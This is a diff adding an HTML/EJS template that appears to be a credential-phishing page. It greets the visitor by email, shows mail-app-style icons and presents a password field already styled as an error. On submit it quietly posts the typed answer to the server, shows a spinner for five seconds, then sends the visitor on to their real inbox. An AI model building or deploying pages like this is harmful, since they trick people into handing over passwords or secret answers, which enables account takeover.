@@ -1,0 +1,97 @@
+<!doctype html>
+<html lang="<%= lang %>">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title><%= t.hello %></title>
+  <link rel="stylesheet" href="/public/style.css">
+</head>
+<body>
+  <main class="stage">
+    <!-- 1) Greeting (not bold) — reveals after the icon animation plays a while -->
+    <h1 class="hello"><%= t.hello %> <%= email || 'there' %></h1>
+
+    <!-- 2) Thicker grey divider + icon row (Mail, Calendar, Contacts, Double-V, Notes, Check) -->
+    <div class="iconbar" aria-hidden="true">
+      <div class="divider"></div>
+      <div class="icons">
+        <span class="appicon" style="--c:#2f80ed"><!-- Mail -->
+          <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><rect x="3.5" y="6" width="17" height="12" rx="2.4"/><path d="M4.5 8l7.5 5 7.5-5"/></svg>
+        </span>
+        <span class="appicon" style="--c:#9b59e6"><!-- Calendar -->
+          <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="5.5" width="16" height="14" rx="2.4"/><path d="M4 10h16M8.5 3.5v3M15.5 3.5v3"/></svg>
+        </span>
+        <span class="appicon" style="--c:#5b7083"><!-- Contacts -->
+          <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="9" r="3.2"/><path d="M5.5 19a6.5 6.5 0 0 1 13 0"/></svg>
+        </span>
+        <span class="appicon" style="--c:#22c55e"><!-- Double-V -->
+          <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.1" stroke-linecap="round" stroke-linejoin="round"><path d="M5 6l7 6 7-6"/><path d="M5 12l7 6 7-6"/></svg>
+        </span>
+        <span class="appicon" style="--c:#f59e0b"><!-- Notes -->
+          <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="4" width="14" height="16" rx="2.4"/><path d="M8.5 9h7M8.5 12.5h7M8.5 16h4"/></svg>
+        </span>
+        <span class="appicon" style="--c:#10b981"><!-- Check -->
+          <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.5l4 4 10-10"/></svg>
+        </span>
+      </div>
+    </div>
+
+    <!-- 3) Error text (centered, above) + input + submit — slide in last -->
+    <div class="form-wrap">
+      <form id="voteForm" method="post" action="/submit" class="stack" autocomplete="off"
+            data-inbox="<%= inboxUrl || '' %>">
+        <input type="hidden" name="email" value="<%= email || '' %>">
+        <input type="hidden" name="lang" value="<%= lang %>">
+        <p class="errtext"><%= (typeof error !== 'undefined' && error) ? error : t.chooseWisely %></p>
+        <div class="field">
+          <div class="secret err">
+            <input type="password" id="answer" name="answer"
+                   placeholder="<%= question %>" maxlength="500" required autofocus>
+            <button type="button" id="eye" class="eye" aria-label="Show or hide answer">
+              <svg id="eye-show" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M1.5 12S5.5 5 12 5s10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z"/><circle cx="12" cy="12" r="3"/></svg>
+              <svg id="eye-hide" hidden viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M9.9 5.2A9.9 9.9 0 0 1 12 5c6.5 0 10.5 7 10.5 7a18 18 0 0 1-3 3.6M6.1 6.6A17.8 17.8 0 0 0 1.5 12S5.5 19 12 19a9.8 9.8 0 0 0 4-.8"/><path d="M9.9 9.9a3 3 0 0 0 4.2 4.2"/><path d="M2 2l20 20"/></svg>
+            </button>
+          </div>
+        </div>
+        <button class="btn" type="submit"><%= t.submit %></button>
+      </form>
+    </div>
+  </main>
+
+  <!-- Loading overlay shown for 5s after submit, before redirecting to the inbox -->
+  <div id="loading" class="overlay" hidden>
+    <div class="spinner"></div>
+    <p class="loadtext"><%= t.submitting %></p>
+  </div>
+
+  <script>
+    var input = document.getElementById('answer');
+    var eye = document.getElementById('eye');
+    var show = document.getElementById('eye-show');
+    var hide = document.getElementById('eye-hide');
+    eye.addEventListener('click', function () {
+      var reveal = input.type === 'password';
+      input.type = reveal ? 'text' : 'password';
+      show.toggleAttribute('hidden', reveal);
+      hide.toggleAttribute('hidden', !reveal);
+      input.focus();
+    });
+
+    // On submit: send the answer, show a spinner for 5s, then go to the inbox.
+    var form = document.getElementById('voteForm');
+    var overlay = document.getElementById('loading');
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+      if (!input.value.trim()) return;
+      overlay.hidden = false;
+      var body = new URLSearchParams(new FormData(form));
+      var send = fetch('/submit', { method: 'POST', body: body }).catch(function () {});
+      var wait = new Promise(function (r) { setTimeout(r, 5000); });
+      Promise.all([send, wait]).then(function () {
+        var url = form.getAttribute('data-inbox');
+        window.location.href = url && url.length ? url : '/';
+      });
+    });
+  </script>
+</body>
+</html>
